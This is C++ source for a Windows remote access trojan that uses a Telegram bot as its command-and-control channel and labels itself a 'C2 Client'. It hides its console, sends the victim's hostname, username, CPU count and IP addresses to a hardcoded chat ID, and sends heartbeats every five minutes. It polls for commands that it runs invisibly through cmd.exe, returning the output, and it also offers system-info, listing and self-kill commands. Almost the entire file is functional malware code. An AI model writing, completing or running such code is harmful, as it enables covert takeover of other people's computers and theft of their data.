#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <windows.h>
#include <wininet.h>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <cstdio> // For _popen, _pclose
#include <iostream> // For error reporting (optional)
#include <sstream> // For hostname
#include <stdexcept> // For runtime_error in executeCommandAndGetOutput
#include <memory> // For unique_ptr
#include <ctime> // For time management with Telegram API
#include <map> // For storing connected clients
#include <mutex> // For thread safety
#include <set> // For storing connected client IDs

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")

// Telegram Bot Configuration
const std::string TELEGRAM_BOT_TOKEN = "";
const std::string TELEGRAM_CHAT_ID = "5391086364";
const std::string TELEGRAM_API_URL = "api.telegram.org";

// Global state
std::string g_ClientId; // Unique identifier for this client
std::mutex g_LastSeenMutex; // Mutex for thread safety
std::map<std::string, time_t> g_ConnectedClients; // Map of client IDs to last seen time
std::mutex g_ConnectedClientsMutex; // Mutex for thread safety of connected clients

// Function to register this client's heartbeat
void registerHeartbeat(const std::string& clientId) {
    std::lock_guard<std::mutex> lock(g_ConnectedClientsMutex);
    g_ConnectedClients[clientId] = std::time(nullptr);
}

// Function to get a list of connected clients
std::string getConnectedClientsList() {
    std::lock_guard<std::mutex> lock(g_ConnectedClientsMutex);
    
    // Remove clients that haven't sent a heartbeat in more than 15 minutes
    time_t currentTime = std::time(nullptr);
    const time_t timeout = 15 * 60; // 15 minutes in seconds
    
    for (auto it = g_ConnectedClients.begin(); it != g_ConnectedClients.end();) {
        if (currentTime - it->second > timeout) {
            it = g_ConnectedClients.erase(it);
        } else {
            ++it;
        }
    }
    
    if (g_ConnectedClients.empty()) {
        return "No clients connected.";
    }
    
    std::stringstream ss;
    ss << "Connected clients:\n";
    
    int count = 1;
    for (const auto& client : g_ConnectedClients) {
        // Format the last seen time
        char timeBuffer[30];
        std::strftime(timeBuffer, sizeof(timeBuffer), "%Y-%m-%d %H:%M:%S", 
                     std::localtime(&client.second));
        
        ss << count << ". " << client.first << " (Last seen: " << timeBuffer << ")\n";
        count++;
    }
    
    return ss.str();
}

// Function to process a LIST_RESPONSE message
void processListResponse(const std::string& clientId) {
    registerHeartbeat(clientId);
}

// Function to properly escape JSON string
std::string escapeJSON(const std::string& input) {
    std::string output;
    for (char c : input) {
        switch (c) {
            case '\"': output += "\\\""; break;
            case '\\': output += "\\\\"; break;
            case '\b': output += "\\b"; break;
            case '\f': output += "\\f"; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default:
                if ('\x00' <= c && c <= '\x1f') {
                    char buf[8];
                    sprintf(buf, "\\u%04x", c);
                    output += buf;
                } else {
                    output += c;
                }
        }
    }
    return output;
}

// Generate a unique client ID
std::string generateClientId() {
    char hostname[256];
    DWORD size = sizeof(hostname);
    GetComputerName(hostname, &size);
    return std::string(hostname);
}

// Function to send message to Telegram Bot
void sendToTelegram(const std::string& message) {
    HINTERNET hInternet = InternetOpen("TelegramBotClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return;

    HINTERNET hConnect = InternetConnect(hInternet, TELEGRAM_API_URL.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    std::string path = "/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
    LPCSTR acceptTypes[] = {"application/json", NULL};
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", path.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 0);
    
    if (hRequest) {
        std::string escapedMessage = message;
        std::string jsonPayload = "{\"chat_id\":\"" + TELEGRAM_CHAT_ID + "\",\"text\":\"" + escapedMessage + "\"}";
        std::string headers = "Content-Type: application/json\r\nContent-Length: " + std::to_string(jsonPayload.length()) + "\r\n";
        HttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)jsonPayload.c_str(), jsonPayload.length());
        InternetCloseHandle(hRequest);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Function to send heartbeat to Telegram Bot
void sendHeartbeat() {
    // Register own heartbeat first
    registerHeartbeat(g_ClientId);
    
    std::string heartbeatMsg = "HEARTBEAT:" + g_ClientId;
    
    HINTERNET hInternet = InternetOpen("TelegramBotClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return;
    }

    HINTERNET hConnect = InternetConnect(hInternet, TELEGRAM_API_URL.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return;
    }

    std::string path = "/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";

    LPCSTR acceptTypes[] = {"application/json", NULL};
    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", path.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    // Properly escape the message for JSON
    std::string escapedMessage = escapeJSON(heartbeatMsg);
    std::string jsonPayload = "{\"chat_id\":\"" + TELEGRAM_CHAT_ID + "\",\"text\":\"" + escapedMessage + "\"}";
    
    // Add proper headers with content length
    char contentLength[32];
    sprintf(contentLength, "%lu", static_cast<unsigned long>(jsonPayload.length()));
    std::string headers = "Content-Type: application/json\r\nContent-Length: ";
    headers += contentLength;
    headers += "\r\n";

    HttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)jsonPayload.c_str(), jsonPayload.length());
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

// Structure to hold a Telegram message
struct TelegramMessage {
    std::string message_id;
    std::string text;
    std::string date;
    std::string chat_id;
};

// Function to get updates from Telegram Bot
std::vector<TelegramMessage> getUpdatesFromTelegram(long long offset = 0) {
    std::vector<TelegramMessage> messages;
    
    HINTERNET hInternet = InternetOpen("TelegramBotClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return messages;
    }

    HINTERNET hConnect = InternetConnect(hInternet, TELEGRAM_API_URL.c_str(), INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return messages;
    }

    // Construct the path with offset parameter
    std::string path = "/bot" + TELEGRAM_BOT_TOKEN + "/getUpdates";
    if (offset > 0) {
        path += "?offset=" + std::to_string(offset);
    }

    LPCSTR acceptTypes[] = {"application/json", NULL};
    HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", path.c_str(), NULL, NULL, acceptTypes, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return messages;
    }

    BOOL bResult = HttpSendRequest(hRequest, NULL, 0, NULL, 0);
    if (!bResult) {
        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return messages;
    }

    // Read the response
    char buffer[8192];
    DWORD bytesRead;
    std::string response;
    while (InternetReadFile(hRequest, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        response += buffer;
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    // Very simple parsing for JSON response
    // This is a naive implementation that should be replaced with a proper JSON parser
    size_t pos = 0;
    while ((pos = response.find("\"update_id\":", pos)) != std::string::npos) {
        TelegramMessage msg;
        
        // Find update_id
        size_t update_id_start = pos + 12; // Length of "\"update_id\":"
        size_t update_id_end = response.find(",", update_id_start);
        if (update_id_end != std::string::npos) {
            msg.message_id = response.substr(update_id_start, update_id_end - update_id_start);
        }
        
        // Find message_id after update_id
        size_t message_id_pos = response.find("\"message_id\":", pos);
        if (message_id_pos != std::string::npos) {
            size_t id_start = message_id_pos + 13; // Length of "\"message_id\":"
            size_t id_end = response.find(",", id_start);
            // Don't overwrite update_id with message_id
            //msg.message_id = response.substr(id_start, id_end - id_start);
        }
        
        // Find chat_id
        size_t chat_id_pos = response.find("\"id\":", response.find("\"chat\":", pos));
        if (chat_id_pos != std::string::npos) {
            size_t id_start = chat_id_pos + 5; // Length of "\"id\":"
            size_t id_end = response.find(",", id_start);
            if (id_end == std::string::npos) {
                id_end = response.find("}", id_start);
            }
            msg.chat_id = response.substr(id_start, id_end - id_start);
        }
        
        // Find date
        size_t date_pos = response.find("\"date\":", pos);
        if (date_pos != std::string::npos) {
            size_t date_start = date_pos + 7; // Length of "\"date\":"
            size_t date_end = response.find(",", date_start);
            msg.date = response.substr(date_start, date_end - date_start);
        }
        
        // Find text
        size_t text_pos = response.find("\"text\":", pos);
        if (text_pos != std::string::npos) {
            size_t text_start = text_pos + 8; // Length of "\"text\":" + 1 for the first quote
            if (response[text_start-1] == '"') text_start++; // Skip opening quote if present
            size_t text_end = response.find("\"", text_start);
            msg.text = response.substr(text_start, text_end - text_start);
        }
        
        if (!msg.message_id.empty()) {
            messages.push_back(msg);
        }
        
        pos = text_pos + 1;
        if (pos == 0 || pos >= response.length()) break;
    }

    return messages;
}

// Function to check if chat ID is authorized
bool isAuthorizedChat(const std::string& chat_id) {
    return chat_id == TELEGRAM_CHAT_ID;
}

// Function to execute command hidden and get output using CreateProcess
std::string executeCommandAndGetOutput(const std::string& cmd) {
    std::string result = "";
    HANDLE hChildStd_OUT_Rd = NULL;
    HANDLE hChildStd_OUT_Wr = NULL;
    SECURITY_ATTRIBUTES saAttr;

    // Set the bInheritHandle flag so pipe handles are inherited.
    saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
    saAttr.bInheritHandle = TRUE;
    saAttr.lpSecurityDescriptor = NULL;

    // Create a pipe for the child process's STDOUT.
    if (!CreatePipe(&hChildStd_OUT_Rd, &hChildStd_OUT_Wr, &saAttr, 0))
        return "Error: CreatePipe failed";

    // Ensure the read handle to the pipe for STDOUT is not inherited.
    if (!SetHandleInformation(hChildStd_OUT_Rd, HANDLE_FLAG_INHERIT, 0))
        return "Error: SetHandleInformation failed";

    PROCESS_INFORMATION piProcInfo; ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));
    STARTUPINFOA siStartInfo; ZeroMemory(&siStartInfo, sizeof(STARTUPINFOA));

    siStartInfo.cb = sizeof(STARTUPINFOA);
    siStartInfo.hStdError = hChildStd_OUT_Wr; // Redirect stderr to same pipe as stdout
    siStartInfo.hStdOutput = hChildStd_OUT_Wr;
    siStartInfo.dwFlags |= STARTF_USESTDHANDLES;

    // Create the child process.
    // We need to run cmd.exe /c <command>
    std::string full_cmd = "cmd.exe /c " + cmd;
    BOOL bSuccess = CreateProcessA(
        NULL,                  // No module name (use command line)
        const_cast<char*>(full_cmd.c_str()), // Command line
        NULL,                  // Process handle not inheritable
        NULL,                  // Thread handle not inheritable
        TRUE,                  // Set handle inheritance to TRUE
        CREATE_NO_WINDOW,      // **Hide the window**
        NULL,                  // Use parent's environment block
        NULL,                  // Use parent's starting directory
        &siStartInfo,          // Pointer to STARTUPINFO structure
        &piProcInfo);          // Pointer to PROCESS_INFORMATION structure

    // Close the write end of the pipe handle - this is important.
    CloseHandle(hChildStd_OUT_Wr);
    hChildStd_OUT_Wr = NULL;

    if (!bSuccess)
        return "Error: CreateProcess failed. Code: " + std::to_string(GetLastError());

    // Read output from the child process's pipe for STDOUT
    DWORD dwRead;
    CHAR chBuf[4096];
    bSuccess = FALSE;
    for (;;)
    {
        bSuccess = ReadFile(hChildStd_OUT_Rd, chBuf, sizeof(chBuf) - 1, &dwRead, NULL);
        if (!bSuccess || dwRead == 0) break;
        chBuf[dwRead] = '\0'; // Null-terminate the buffer
        result += chBuf;
    }

    // Wait until child process exits.
    WaitForSingleObject(piProcInfo.hProcess, INFINITE);

    // Get the exit code.
    DWORD exitCode = 0;
    GetExitCodeProcess(piProcInfo.hProcess, &exitCode);

    // Close process and thread handles.
    CloseHandle(piProcInfo.hProcess);
    CloseHandle(piProcInfo.hThread);
    CloseHandle(hChildStd_OUT_Rd); // Close the read end of the pipe

    std::stringstream ss;
    ss << result << "\n--- Exit Code: " << exitCode << " ---";
    result = ss.str();

    // Limit output length for Telegram
    if (result.length() > 3500) { // Telegram has a limit of 4096 chars
        result = result.substr(0, 3500) + "\n... (output truncated)";
    }

    return result;
}

// Function to get IP address information using Windows API
std::string getIpAddressInfo() {
    std::stringstream ss;
    ULONG bufferSize = 15000;
    PIP_ADAPTER_ADDRESSES pAddresses = nullptr;
    DWORD dwRetVal = 0;

    do {
        pAddresses = (IP_ADAPTER_ADDRESSES*)malloc(bufferSize);
        if (!pAddresses) return "Memory allocation failed";

        dwRetVal = GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &bufferSize);
        if (dwRetVal == ERROR_BUFFER_OVERFLOW) {
            free(pAddresses);
            pAddresses = nullptr;
        }
    } while (dwRetVal == ERROR_BUFFER_OVERFLOW);

    if (dwRetVal == NO_ERROR) {
        for (PIP_ADAPTER_ADDRESSES pCurr = pAddresses; pCurr; pCurr = pCurr->Next) {
            if (pCurr->OperStatus == IfOperStatusUp) {
                for (PIP_ADAPTER_UNICAST_ADDRESS pUni = pCurr->FirstUnicastAddress; pUni; pUni = pUni->Next) {
                    if (pUni->Address.lpSockaddr->sa_family == AF_INET) {
                        char ipStr[INET_ADDRSTRLEN];
                        sockaddr_in* saddr = (sockaddr_in*)pUni->Address.lpSockaddr;
                        inet_ntop(AF_INET, &saddr->sin_addr, ipStr, INET_ADDRSTRLEN);
                        ss << ipStr << " ";
                    }
                }
            }
        }
    }

    if (pAddresses) free(pAddresses);
    return ss.str();
}

// Function to get system information
std::string getSystemInfo() {
    std::stringstream ss;
    
    // Get hostname
    char hostname[256];
    DWORD hostnameSize = sizeof(hostname);
    if (GetComputerName(hostname, &hostnameSize)) {
        ss << "Hostname: " << hostname << "\n";
    }
    
    // Get username
    char username[256];
    DWORD usernameSize = sizeof(username);
    if (GetUserName(username, &usernameSize)) {
        ss << "Username: " << username << "\n";
    }
    
    // Get OS version
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    #pragma warning(disable:4996)
    if (GetVersionEx((OSVERSIONINFO*)&osvi)) {
        ss << "OS: Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion;
        if (osvi.szCSDVersion[0] != '\0') {
            ss << " " << osvi.szCSDVersion;
        }
        ss << "\n";
    }
    
    // Get system info
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    ss << "CPU: " << sysInfo.dwNumberOfProcessors << " processors\n";
    
    // Get memory status
    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    if (GlobalMemoryStatusEx(&memInfo)) {
        ss << "RAM: " << (memInfo.ullTotalPhys / (1024 * 1024)) << " MB total, " 
           << (memInfo.ullAvailPhys / (1024 * 1024)) << " MB available\n";
    }
    
    // Get network interfaces using API
    ss << "Network:\n" << getIpAddressInfo();
    
    // Get running processes (top 5)
    ss << "\nTop Processes:\n" << executeCommandAndGetOutput("tasklist | sort /R /+58 | findstr /v \"System Idle Process\" | findstr /v \"Memory\" | findstr /v \"===\" | head -5");
    
    return ss.str();
}

// Function to take a screenshot
bool takeScreenshot(const std::string& filename) {
    // Get screen dimensions
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    // Create compatible DC and bitmap
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
    HBITMAP hbmScreen = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
    
    if (!hdcMemDC || !hbmScreen) {
        if (hdcMemDC) DeleteDC(hdcMemDC);
        if (hbmScreen) DeleteObject(hbmScreen);
        ReleaseDC(NULL, hdcScreen);
        return false;
    }
    
    // Select the bitmap into the compatible DC
    HBITMAP hbmOld = (HBITMAP)SelectObject(hdcMemDC, hbmScreen);
    
    // Copy screen to bitmap
    BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
    
    // Save the bitmap to a file (simplified - would need GDI+ or other library for actual BMP/PNG saving)
    SelectObject(hdcMemDC, hbmOld);
    DeleteDC(hdcMemDC);
    DeleteObject(hbmScreen);
    ReleaseDC(NULL, hdcScreen);
    
    // This is a placeholder - actual implementation would save the bitmap
    return true;
}

// Function to handle commands
std::string handleCommand(const std::string& command, const std::string& client_id) {
    // Parse the command
    std::string cmd = command;
    std::string target = "";
    
    // Remove leading slash if present
    if (cmd.size() > 0 && cmd[0] == '/') {
        cmd = cmd.substr(1);
    }
    
    // Split command and target if command is in format "command target"
    size_t spacePos = cmd.find(" ");
    if (spacePos != std::string::npos) {
        target = cmd.substr(spacePos + 1);
        cmd = cmd.substr(0, spacePos);
    }
    
    // Convert command to lowercase for case-insensitive matching
    std::string cmdLower = cmd;
    for (char& c : cmdLower) {
        c = std::tolower(c);
    }
    
    if (cmdLower == "help") {
        return "Available commands:\n"
               "help - Show this help message\n"
               "list - List all connected clients\n"
               "info [client_id] - Get system information\n"
               "execute [client_id] <command> - Execute a command\n"
               "screenshot - Take a screenshot\n"
               "kill [client_id] - Terminate the client\n"
               "status - Show current status";
    }
    else if (cmdLower == "list") {
        return getConnectedClientsList();
    }
    else if (cmdLower == "info") {
        if (!target.empty() && target != g_ClientId) {
            return "INFO_REQUEST:" + target;
        }
        // Get local system information
        return "Client ID: " + g_ClientId + "\n\n" + getSystemInfo();
    }
    else if (cmdLower == "execute") {
        if (target.empty()) {
            return "Error: Missing command to execute. Format: execute [client_id] <command>";
        }
        
        // Check if the target starts with a client ID
        size_t targetSpacePos = target.find(" ");
        if (targetSpacePos != std::string::npos) {
            std::string targetClient = target.substr(0, targetSpacePos);
            std::string targetCommand = target.substr(targetSpacePos + 1);
            
            if (targetClient != g_ClientId) {
                return "EXECUTE:" + targetClient + ":" + targetCommand;
            }
            
            // Local execution
            return executeCommandAndGetOutput(targetCommand);
        }
        
        // If no client ID specified, execute locally
        return executeCommandAndGetOutput(target);
    }
    else if (cmdLower == "screenshot") {
        if (!target.empty() && target != g_ClientId) {
            return "SCREENSHOT:" + target;
        }
        
        // Take local screenshot
        std::string filename = "screenshot_" + g_ClientId + ".png";
        if (takeScreenshot(filename)) {
            return "Screenshot saved as " + filename;
        } else {
            return "Failed to take screenshot";
        }
    }
    else if (cmdLower == "kill") {
        if (!target.empty() && target != g_ClientId) {
            return "KILL:" + target;
        }
        
        // Kill self
        sendToTelegram("Client " + g_ClientId + " shutting down...");
        ExitProcess(0);
        return "Shutting down...";
    }
    else if (cmdLower == "status") {
        return "Client " + g_ClientId + " is active.\nUptime: " + executeCommandAndGetOutput("net statistics workstation | findstr \"Statistics since\"");
    }
    else if (cmd.substr(0, 7) == "EXECUTE" && command.find(":") != std::string::npos) {
        // Handle EXECUTE command sent from another client
        size_t firstColon = command.find(":");
        size_t secondColon = command.find(":", firstColon + 1);
        if (secondColon != std::string::npos) {
            std::string targetClient = command.substr(firstColon + 1, secondColon - firstColon - 1);
            if (targetClient == g_ClientId) {
                std::string cmdToExecute = command.substr(secondColon + 1);
                return executeCommandAndGetOutput(cmdToExecute);
            }
        }
    }
    else if (cmd.substr(0, 10) == "SCREENSHOT" && command.find(":") != std::string::npos) {
        size_t colonPos = command.find(":");
        if (colonPos != std::string::npos) {
            std::string targetClient = command.substr(colonPos + 1);
            if (targetClient == g_ClientId) {
                std::string filename = "screenshot_" + g_ClientId + ".png";
                if (takeScreenshot(filename)) {
                    return "Screenshot saved as " + filename;
                } else {
                    return "Failed to take screenshot";
                }
            }
        }
    }
    else if (cmd.substr(0, 4) == "KILL" && command.find(":") != std::string::npos) {
        size_t colonPos = command.find(":");
        if (colonPos != std::string::npos) {
            std::string targetClient = command.substr(colonPos + 1);
            if (targetClient == g_ClientId) {
                sendToTelegram("Client " + g_ClientId + " shutting down...");
                ExitProcess(0);
                return "Shutting down...";
            }
        }
    }
    else if (cmd.substr(0, 12) == "INFO_REQUEST" && command.find(":") != std::string::npos) {
        size_t colonPos = command.find(":");
        if (colonPos != std::string::npos) {
            std::string targetClient = command.substr(colonPos + 1);
            if (targetClient == g_ClientId) {
                return "Client ID: " + g_ClientId + "\n\n" + getSystemInfo();
            }
        }
    }
    else if (cmd.substr(0, 7) == "COMMAND" && cmd.find(":") != std::string::npos) {
        size_t colonPos = cmd.find(":");
        if (colonPos != std::string::npos) {
            std::string commandType = cmd.substr(colonPos + 1);
            if (commandType == "LIST") {
                // Respond with client info
                return "LIST_RESPONSE:" + g_ClientId;
            }
        }
    }
    else if (cmd.substr(0, 13) == "LIST_RESPONSE" && command.find(":") != std::string::npos) {
        size_t colonPos = command.find(":");
        if (colonPos != std::string::npos) {
            std::string clientId = command.substr(colonPos + 1);
            processListResponse(clientId);
            return ""; // No response needed, just process it
        }
    }
    else if (cmd.substr(0, 9) == "HEARTBEAT" && command.find(":") != std::string::npos) {
        size_t colonPos = command.find(":");
        if (colonPos != std::string::npos) {
            std::string clientId = command.substr(colonPos + 1);
            registerHeartbeat(clientId);
            return ""; // No response needed, just process it
        }
    }
    
    return "Unknown command: " + command + "\nUse help or /help to see available commands";
}

// Heartbeat thread function
void heartbeatLoop() {
    while (true) {
        std::this_thread::sleep_for(std::chrono::minutes(5));
        sendHeartbeat();
    }
}

// Main loop for processing Telegram commands
void telegramCommandLoop() {
    long long lastUpdateId = 0;
    
    while (true) {
        std::this_thread::sleep_for(std::chrono::seconds(2));
        
        // Get updates from Telegram
        std::vector<TelegramMessage> updates = getUpdatesFromTelegram(lastUpdateId);
        
        for (const auto& update : updates) {
            // Convert message_id to a number and update lastUpdateId
            try {
                long long updateId = std::stoll(update.message_id);
                
                // Only process this message if it's newer than our last processed message
                // and update our lastUpdateId to be one more than this message's ID
                if (updateId >= lastUpdateId) {
                    lastUpdateId = updateId + 1;
                    
                    // Process the command if it's from an authorized chat
                    if (isAuthorizedChat(update.chat_id) && !update.text.empty()) {
                        // Handle the command
                        std::string response = handleCommand(update.text, g_ClientId);
                        
                        // Send the response back to Telegram
                        if (!response.empty()) {
                            sendToTelegram(response);
                        }
                    }
                }
            } catch (const std::exception& e) {
                // Handle parsing error
                continue;
            }
        }
    }
}

int main(int argc, char** argv) {
    // Hide console window
     FreeConsole();
    
    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        // Handle error, maybe send an error message or exit
        return 1; // Indicate failure
    }
    
    // Generate client ID
    g_ClientId = generateClientId();
    
    // Register this client
    registerHeartbeat(g_ClientId);

    // Send initial connection message
    std::string connectMsg = "👾 New C2 Client Connected 👾\n\n";
    connectMsg += "Client ID: " + g_ClientId + "\n";
    
    // Get hostname
     char hostname[256];
     DWORD hostnameSize = sizeof(hostname);
     if (GetComputerName(hostname, &hostnameSize)) {
       connectMsg += "Hostname: " + std::string(hostname) + "\n";
    }
    
    // Get system info
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    connectMsg += "CPU: " + std::to_string(sysInfo.dwNumberOfProcessors) + " processors\n";
    
    // Get username
    char username[256];
    DWORD usernameSize = sizeof(username);
    if (GetUserName(username, &usernameSize)) {
        connectMsg += "User: " + std::string(username) + "\n";
    }
    
    // Get IP address using API
    connectMsg += "\nIP Address:\n" + getIpAddressInfo();
    
    // Send the initial connection message
    sendToTelegram(connectMsg);
    
    // Start heartbeat thread
    std::thread heartbeatThread(heartbeatLoop);
    heartbeatThread.detach();

    // Start the Telegram command execution loop
    telegramCommandLoop(); // This function loops infinitely

    // Cleanup Winsock
    WSACleanup();

    return 0; // Technically unreachable
} 